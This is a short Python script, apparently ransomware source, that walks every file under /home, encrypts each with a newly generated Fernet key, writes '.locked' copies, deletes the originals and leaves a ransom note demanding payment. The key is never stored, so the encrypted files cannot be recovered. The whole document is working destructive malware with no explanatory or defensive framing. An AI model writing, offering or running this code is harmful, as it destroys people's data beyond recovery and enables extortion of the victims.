#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

key = Fernet.generate_key()
cipher = Fernet(key)

for root, dirs, files in os.walk("/home"):
    for file in files:
        target = os.path.join(root, file)
        with open(target, "rb") as f:
            data = f.read()
        encrypted = cipher.encrypt(data)
        with open(target + ".locked", "wb") as f:
            f.write(encrypted)
        os.remove(target)

with open("/home/README_RANSOM.txt", "w") as f:
    f.write("All your files have been locked. Send ransom to decrypt.")
